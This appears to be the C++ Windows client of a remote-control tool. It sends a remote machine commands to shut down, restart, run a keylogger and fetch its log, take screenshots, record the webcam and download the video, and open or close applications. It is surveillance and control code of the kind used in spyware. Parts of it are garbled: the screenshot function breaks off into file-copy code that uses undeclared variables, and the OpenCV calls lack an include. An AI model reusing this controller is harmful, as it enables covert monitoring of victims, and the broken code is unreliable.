#include "client_socket.h"
#include <iostream>
#include <fstream>
#include <conio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

Client::Client(const std::string& serverIP, int port)
    : serverIP(serverIP), port(port), clientSocket(INVALID_SOCKET) {
    // Initialize Winsock
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
    }
}

Client::~Client() {
    // Cleanup
    if (clientSocket != INVALID_SOCKET) {
        closesocket(clientSocket);
    }
    WSACleanup();
}

bool Client::connectToServer() {
    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        WSACleanup();
        return false;
    }

    // Setup sockaddr_in structure
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());
    serverAddr.sin_port = htons(port);

    // Connect to server
    int result = connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        std::cerr << "Unable to connect to server: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        return false;
    }

    int timeout = 60000; // 60 second
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
    setsockopt(clientSocket, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));

    return true;
}

bool Client::sendShutdownRequest() {
    const char* message = "shutdown";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    std::cout << "Shutdown request sent successfully!" << std::endl;
    return true;
}

bool Client::sendRestartRequest() {
    const char* message = "restart";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    std::cout << "Restart request sent successfully!" << std::endl;
    return true;
}

bool  Client::sendKeyloggerStartRequest(){
    const char* message = "startKeylogger";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    
    return true;
}

bool Client::sendKeyloggerOffRequest(){
    const char* message = "offKeylogger";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    sendFileCopyRequest("log.txt", "copy_log.txt");
    return true;
}
   
bool Client::sendScreenshotRequest()
{
    const char* requestMessage = "screenshot";
    int sendResult = send(clientSocket, requestMessage, strlen(requestMessage), 0);
    if (sendResult == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }

    int dataSize;
    if (recv(clientSocket, reinterpret_cast<char*>(&dataSize), sizeof(dataSize), 0) <= 0) {
        std::cerr << "Failed to receive data size.\n";
        return false;
    }

    std::vector<uchar> buffer(dataSize);
    int bytesReceived = 0;
    while (bytesReceived < dataSize) {
        int result = recv(clientSocket, reinterpret_cast<char*>(buffer.data() + bytesReceived), dataSize - bytesReceived, 0);
        if (result <= 0) {
            std::cerr << "Failed to receive image data.\n";
            return false;
        }
        bytesReceived += result;
    }

    cv::Mat image = cv::imdecode(buffer, cv::IMREAD_COLOR);
    if (image.empty()) {
        std::cerr << "Failed to decode image data.\n";
        return false;
    }
    
    fileSize = ntohl(fileSize); // Convert from network byte order to host byte order

    // Now receive the actual file data
    std::vector<char> fileData(fileSize);
    int totalBytesReceived = 0;

    while (totalBytesReceived <static_cast<int>(fileSize)) {
        std::size_t bytesToReceive = std::min(static_cast<std::size_t>(fileSize) - totalBytesReceived, sizeof(fileData));

        bytesReceived = recv(clientSocket, fileData.data() + totalBytesReceived, bytesToReceive, 0);
        if (bytesReceived <= 0) {
            std::cerr << "Failed to receive file data: " << WSAGetLastError() << std::endl;
            return false;
        }
        totalBytesReceived += bytesReceived;
    }

    // Save the received data to a file
    std::ofstream outputFile(destinationFileName, std::ios::binary);
    if (!outputFile) {
        std::cerr << "Failed to create output file: " << destinationFileName << std::endl;
        return false;
    }
    outputFile.write(fileData.data(), fileSize);
    outputFile.close();

    std::cout << "File copied and saved as: " << destinationFileName << std::endl;
    return true;
}

bool Client::sendWebcamRequest() {
    std::string request = "open_webcam";
    std::cout << "Webcam request sending..." << std::endl;

    if (send(clientSocket, request.c_str(), request.size(), 0) == SOCKET_ERROR) {
        std::cerr << "Failed to send webcam request: " << WSAGetLastError() << std::endl;
        return false;
    }

    std::cout << "Webcam request sent to server." << std::endl;
    std::string demand;
    while (1)
    {
        std::cout << "In webcam, next demand (start/stop/close): ";

        std::cin >> demand;

        if (demand == "start") sendStartWebcamRequest();
        else if (demand == "stop") sendStopWebcamRequest();
        else if (demand == "close") {
            sendCloseWebcamRequest();
            break;
        }
    }
    std::cin.ignore();
    return true;
}

bool Client::sendStartWebcamRequest()
{
    std:: string request = "start_webcam";

    if (send(clientSocket, request.c_str(), request.size(), 0) == SOCKET_ERROR)
    {
        std::cerr << "Failed to send start webcam request: " << WSAGetLastError() << std::endl;
        return false;
    }

    std::cout << "Start webcam request sent to server." << std::endl;
    return true;
}

bool Client::sendStopWebcamRequest()
{
    std:: string request = "stop_webcam";

    if (send(clientSocket, request.c_str(), request.size(), 0) == SOCKET_ERROR)
    {
        std::cerr << "Failed to send start webcam request: " << WSAGetLastError() << std::endl;
        return false;
    }

    std::cout << "Stop webcam request sent to server." << std::endl;

    // Receive the initial response from the server (either file size or an error message)
    char responseBuffer[256];
    int bytesReceived = recv(clientSocket, responseBuffer, sizeof(responseBuffer) - 1, 0);
    if (bytesReceived <= 0) {
        std::cerr << "Failed to receive initial response from server: " << WSAGetLastError() << std::endl;
        return false;
    }
    responseBuffer[bytesReceived] = '\0'; // Null-terminate the response

    // Check if the response is an error message
    std::string response(responseBuffer);
    if (response.find("Failed") != std::string::npos) {
        std::cerr << "Server error: " << response << std::endl;
        return false;
    }
    std::cout << "Server message: " << response << std::endl;

    // Receive the size of the file first
    uint32_t fileSize;
    bytesReceived = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
    if (bytesReceived <= 0) {
        std::cerr << "Failed to receive file size: " << WSAGetLastError() << std::endl;
        return false;
    }
    fileSize = ntohl(fileSize); // Convert from network byte order to host byte order

    // Now receive the actual file data
    std::vector<char> fileData(fileSize);
    int totalBytesReceived = 0;

    while (totalBytesReceived < static_cast<int>(fileSize)) {
        std::size_t bytesToReceive = std::min(static_cast<std::size_t>(fileSize) - totalBytesReceived, sizeof(fileData));

        bytesReceived = recv(clientSocket, fileData.data() + totalBytesReceived, bytesToReceive, 0);
        if (bytesReceived <= 0) {
            std::cerr << "Failed to receive file data: " << WSAGetLastError() << std::endl;
            return false;
        }
        totalBytesReceived += bytesReceived;
    }

    std::ofstream outputFile("RecordFromServer.mp4", std::ios::binary);
    if (!outputFile)
    {
        std::cerr << "Failed to create output file: " << "RecordFromServer.mp4" << std::endl;
        return false;
    }

    outputFile.write(fileData.data(), fileSize);
    outputFile.close();

    std::cout << "File copied and saved as: " << "RecordFromServer.mp4" << std::endl;

    return true;
}

bool Client::sendCloseWebcamRequest()
{
    std::string request = "close_webcam";

    if (send(clientSocket, request.c_str(), request.size(), 0) == SOCKET_ERROR)
    {
        std::cerr << "Failed to send start webcam request: " << WSAGetLastError() << std::endl;
        return false;
    }

    std::cout << "Close webcam request sent to server." << std::endl;
    return true;
}

bool Client::sendCloseConnection()
{
    std::string request = "close_connection";

    if (send(clientSocket, request.c_str(), request.size(), 0) == SOCKET_ERROR)
    {
        std::cerr << "Failed to send close connection request: " << WSAGetLastError() << std::endl;
        return false;
    }

    // Receive the size of the file first
    uint32_t fileSize;
    int bytesReceived = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
    if (bytesReceived <= 0) {
        std::cerr << "Failed to receive file size: " << WSAGetLastError() << std::endl;
        return false;
    }
    fileSize = ntohl(fileSize); // Convert from network byte order to host byte order

    // Now receive the actual file data
    std::vector<char> fileData(fileSize);
    int totalBytesReceived = 0;

    while (totalBytesReceived < static_cast<int>(fileSize)) {
        std::size_t bytesToReceive = std::min(static_cast<std::size_t>(fileSize) - totalBytesReceived, sizeof(fileData));

        bytesReceived = recv(clientSocket, fileData.data() + totalBytesReceived, bytesToReceive, 0);
        if (bytesReceived <= 0) {
            std::cerr << "Failed to receive file data: " << WSAGetLastError() << std::endl;
            return false;
        }
        totalBytesReceived += bytesReceived;
    }

    // Save the received data to a file
    std::ofstream outputFile(destinationFileName, std::ios::binary);
    if (!outputFile) {
        std::cerr << "Failed to create output file: " << destinationFileName << std::endl;
        return false;
    }
    outputFile.write(fileData.data(), fileSize);
    outputFile.close();

    std::cout << "File copied and saved as: " << destinationFileName << std::endl;
    return true;
}

bool Client::sendListOfAppRequest(){
    const char* message = "listApp";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    sendFileCopyRequest("applications.txt", "copy_applications.txt");
    return true;
}

bool Client::sendOpenAppRequest(const std::string& appName){
    std::string message = "openApp|" + appName;
    int result = send(clientSocket, message.c_str(), message.size(), 0);
    if (result == SOCKET_ERROR){
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    return true;
}

bool Client::sendCloseAppRequest(const std::string& appName){
    std::string message = "closeApp|" + appName;
    int result = send(clientSocket, message.c_str(), message.size(), 0);
    if (result == SOCKET_ERROR){
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    return true;
}

bool Client::sendListOfServiceRequest(){
    const char* message = "listService";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    sendFileCopyRequest("ListOfServices.txt", "copy_ListOfServices.txt");
    return true;
}



